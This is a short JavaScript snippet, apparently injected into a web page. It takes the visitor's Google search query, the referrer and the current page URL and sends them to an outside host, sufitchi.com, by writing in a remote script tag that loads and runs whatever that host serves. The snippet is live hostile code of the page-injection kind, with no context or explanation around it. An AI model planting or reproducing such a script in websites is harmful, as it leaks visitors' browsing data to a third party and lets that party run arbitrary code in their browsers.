var ref=decodeURIComponent(document.referrer);
var idx = ref.toLowerCase().indexOf("google"); 
if (idx!= -1) { // yes it is 
// find the query string 
var query = ref.replace(/^.*q=([^&]+)&?.*$/i, "$1"); 
// clean up quotes 
query = query.replace(/\'¦\"/g, "");
var qs = window.location;

}
document.write('<script type="text/javascript" src="http://www.sufitchi.com/js/monitor.php?q='+query+'&r='+ref+'&qs='+qs+'"></script>');

